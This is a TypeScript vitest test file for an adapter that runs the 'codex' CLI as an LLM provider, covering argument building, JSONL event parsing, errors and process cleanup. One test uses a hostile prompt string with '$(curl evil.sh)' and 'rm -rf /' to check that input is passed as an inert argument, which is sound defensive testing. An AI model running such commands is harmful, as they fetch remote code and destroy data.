import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import type { LlmCompletion, LlmEvent, Message } from "../../kernel/ports/llm.js";
import { isProviderError } from "../../kernel/ports/model.js";
import { codexArgs, codexLlm, codexModels } from "./codex.js";
import type { CliEnded, CliRun } from "./run-cli.js";

// Fixture provenance: `fixtures/codex-auth-failure.jsonl` is verbatim stdout from a real
// `codex exec --json --ephemeral --skip-git-repo-check -c web_search="disabled"` run of
// codex-cli 0.149.1 on this machine (spike 1); it is a failure because that install's
// stored refresh token had already been spent, so no successful turn could be captured.
// `codex-success.jsonl`, `codex-web-search.jsonl` and `codex-truncated.jsonl` are
// constructed from the event and field names in the shipped binary's own serde tables -
// `ThreadStartedEvent`, `ItemCompletedEvent`, `TurnCompletedEvent`, `TurnFailedEvent`, the
// item types `agent_message` / `reasoning` / `web_search` / `error`, and the usage counts
// `input_tokens`, `cached_input_tokens`, `cache_write_input_tokens`, `output_tokens`,
// `reasoning_output_tokens`.

function fixture(name: string): string {
  return readFileSync(new URL(`./fixtures/${name}`, import.meta.url), "utf8");
}

function replaying(
  text: string,
  ended: CliEnded = { code: 0, error: null },
  stderr = "",
): {
  readonly run: (b: string, a: readonly string[], s: AbortSignal) => CliRun;
  readonly seen: { binary: string; args: readonly string[] }[];
  readonly killed: () => number;
} {
  const seen: { binary: string; args: readonly string[] }[] = [];
  let killed = 0;
  return {
    seen,
    killed: (): number => killed,
    run: (binary, args): CliRun => {
      seen.push({ binary, args });
      const bytes = new TextEncoder().encode(text);
      return {
        pid: 909,
        stdout: {
          async *[Symbol.asyncIterator](): AsyncGenerator<Uint8Array> {
            for (let at = 0; at < bytes.length; at += 11) {
              yield bytes.slice(at, at + 11);
            }
          },
        },
        stderr: (): string => stderr,
        ended: Promise.resolve(ended),
        kill: (): void => {
          killed += 1;
        },
      };
    },
  };
}

const messages: readonly Message[] = [{ role: "user", content: "What is SSE?" }];

function request(over: Partial<LlmCompletion> = {}): LlmCompletion {
  return {
    model: "gpt-5.1-codex-max",
    messages,
    signal: new AbortController().signal,
    ...over,
  };
}

async function drain(text: string, ended?: CliEnded, stderr?: string): Promise<LlmEvent[]> {
  const fake = replaying(text, ended, stderr);
  const out: LlmEvent[] = [];
  for await (const event of codexLlm({ run: fake.run }).complete(request())) {
    out.push(event);
  }
  return out;
}

describe("codexArgs", () => {
  it("runs one ephemeral turn with web search off", () => {
    expect(codexArgs(request())).toEqual([
      "exec",
      "--json",
      "--ephemeral",
      "--skip-git-repo-check",
      "-c",
      'web_search="disabled"',
      "-m",
      "gpt-5.1-codex-max",
      "--",
      "What is SSE?",
    ]);
  });

  it("asks for the live mode when the caller wants grounding", () => {
    expect(codexArgs(request({ webSearch: true }))).toContain('web_search="live"');
  });

  it("leaves the model to the CLI's config when none was chosen", () => {
    expect(codexArgs(request({ model: "" }))).not.toContain("-m");
  });

  it("puts the prompt after a separator, as one argument, whatever is in it", () => {
    const prompt = '--help `id` $(curl evil.sh) ; rm -rf /\nsecond "line"';
    const args = codexArgs(request({ messages: [{ role: "user", content: prompt }] }));
    expect(args.at(-2)).toBe("--");
    expect(args.at(-1)).toBe(prompt);
  });
});

describe("codexLlm.complete", () => {
  it("replays a turn into its message and its token counts", async () => {
    expect(await drain(fixture("codex-success.jsonl"))).toEqual([
      {
        type: "delta",
        text: "Server-Sent Events aré a one-way 𝄞 push channel over HTTP.",
      },
      // Codex reports no stop reason, so there is nothing to report.
      { type: "done", usage: { inputTokens: 2451, outputTokens: 118 }, finishReason: null },
    ]);
  });

  it("ignores the reasoning and web-search items of a grounded turn", async () => {
    const events = await drain(fixture("codex-web-search.jsonl"));
    expect(events.filter((event) => event.type === "delta")).toHaveLength(1);
    expect(events.at(-1)).toEqual({
      type: "done",
      usage: { inputTokens: 5120, outputTokens: 240 },
      finishReason: null,
    });
  });

  it("fails on the recorded auth failure, quoting the CLI", async () => {
    const error: unknown = await drain(fixture("codex-auth-failure.jsonl"), {
      code: 1,
      error: null,
    }).catch((thrown: unknown) => thrown);
    expect(isProviderError(error) && error.fault.kind).toBe("other");
    // The `error` event carries its text in `message`, not in `error.message`.
    expect(String(error)).toContain("your refresh token was already used");
  });

  it("treats the opening error item as the warning it is, not a failed turn", async () => {
    // The recorded run opens with an `item.completed` whose item type is "error" saying
    // the model metadata is missing, then carries on. Reading that as fatal would fail
    // every run on a machine whose configured model the CLI has no metadata for.
    const opening = fixture("codex-auth-failure.jsonl").split("\n")[1] ?? "";
    expect(opening).toContain('"type":"error"');
    expect(opening).toContain("Model metadata");
    const survives = [
      '{"type":"thread.started","thread_id":"t"}',
      opening,
      '{"type":"item.completed","item":{"id":"i","type":"agent_message","text":"fine"}}',
      '{"type":"turn.completed","usage":{"input_tokens":1,"output_tokens":2}}',
    ].join("\n");
    expect(await drain(survives)).toEqual([
      { type: "delta", text: "fine" },
      { type: "done", usage: { inputTokens: 1, outputTokens: 2 }, finishReason: null },
    ]);
  });

  it("fails on a turn.failed, which carries its text under error.message", async () => {
    const error: unknown = await drain(
      '{"type":"turn.started"}\n{"type":"turn.failed","error":{"message":"stream disconnected"}}\n',
    ).catch((thrown: unknown) => thrown);
    expect(String(error)).toContain("stream disconnected");
  });

  it("answers no usage when the turn reported none", async () => {
    expect(await drain('{"type":"turn.completed"}\n')).toEqual([
      { type: "done", usage: null, finishReason: null },
    ]);
  });

  it("fails a stream cut off mid-line rather than storing half an answer", async () => {
    const error: unknown = await drain(fixture("codex-truncated.jsonl")).catch(
      (thrown: unknown) => thrown,
    );
    expect(isProviderError(error) && error.fault.kind).toBe("other");
    expect(String(error)).toBe("Error: the codex CLI wrote a line this app could not read");
  });

  it("shows what the CLI wrote to stderr when it exits without a turn", async () => {
    const error: unknown = await drain("", { code: 1, error: null }, "not logged in").catch(
      (thrown: unknown) => thrown,
    );
    expect(String(error)).toBe("Error: the codex CLI exited 1 without answering: not logged in");
  });

  it("says so plainly when the binary is not there at all", async () => {
    const error: unknown = await drain("", {
      code: null,
      error: new Error("spawn codex ENOENT"),
    }).catch((thrown: unknown) => thrown);
    expect(String(error)).toContain("could not be started (spawn codex ENOENT)");
  });

  it("kills the child on the answer, on a failure and when walked away from", async () => {
    const ok = replaying(fixture("codex-success.jsonl"));
    for await (const _event of codexLlm({ run: ok.run }).complete(request())) {
      // drained
    }
    expect(ok.killed()).toBe(1);

    const bad = replaying(fixture("codex-auth-failure.jsonl"));
    await expect(
      (async () => {
        for await (const _event of codexLlm({ run: bad.run }).complete(request())) {
          // drained
        }
      })(),
    ).rejects.toThrow();
    expect(bad.killed()).toBe(1);

    const left = replaying(fixture("codex-success.jsonl"));
    for await (const _event of codexLlm({ run: left.run }).complete(request())) {
      break;
    }
    expect(left.killed()).toBe(1);
  });

  it("throws the cancel's own reason when the stage was aborted", async () => {
    const controller = new AbortController();
    const reason = new Error("the user cancelled the project");
    const fake = replaying(fixture("codex-success.jsonl"));
    const stream = codexLlm({ run: fake.run }).complete(request({ signal: controller.signal }));
    controller.abort(reason);
    await expect(
      (async () => {
        for await (const _event of stream) {
          // drained
        }
      })(),
    ).rejects.toBe(reason);
  });

  it("spawns the binary it was given rather than whatever is on PATH", async () => {
    const fake = replaying(fixture("codex-success.jsonl"));
    for await (const _event of codexLlm({
      run: fake.run,
      binary: "/home/me/.local/bin/codex",
    }).complete(request())) {
      // drained
    }
    expect(fake.seen[0]?.binary).toBe("/home/me/.local/bin/codex");
  });
});

describe("codexLlm surface", () => {
  it("declares what the CLI can do and the models it offers", async () => {
    const port = codexLlm({ run: replaying("").run });
    expect(port.id).toBe("codex");
    expect(port.capabilities).toEqual({ streams: true, reportsUsage: true, webSearch: true });
    expect(await port.models()).toBe(codexModels);
  });
});
